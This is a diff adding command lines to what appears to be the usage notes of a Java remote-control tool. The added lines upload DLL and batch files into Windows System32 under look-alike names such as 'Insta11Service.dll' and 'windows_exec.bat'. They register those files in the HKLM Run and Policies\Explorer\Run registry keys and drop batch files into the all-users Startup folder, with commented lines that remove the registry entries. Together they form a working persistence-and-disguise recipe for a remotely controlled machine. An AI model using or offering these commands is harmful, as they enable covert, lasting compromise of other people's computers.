@@ -19,3 +19,18 @@ java:com.a.A(a,b)   执行java代码
 cd /d %~dp0
 start javaw -Xms215m -Xmx215m -Dfile.encoding=UTF-8 -jar remote-1.0-SNAPSHOT
 exit
+
+
+
+upfile:D:\remotefile\Insta11Service.dll>C:\Windows\System32\Insta11Service.dll
+upfile:D:\remotefile\internetmail.bat>C:\Windows\System32\internetmail.bat
+cmd:reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v one /t REG_SZ /d c:\windows\system32\internetmail.bat /f
+--cmd:reg delete HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v one /f
+
+upfile:D:\remotefile\win_cfg.dll>C:\Windows\System32\win_cfg.dll
+upfile:D:\remotefile\windows_exec.bat>C:\Windows\System32\windows_exec.bat
+cmd:reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /v two /t REG_SZ /d c:\windows\system32\windows_exec.bat /f
+--cmd:reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /v two /f
+
+upfile:D:\remotefile\dll>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\dll
+upfile:D:\remotefile\ick.bat>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\ick.bat
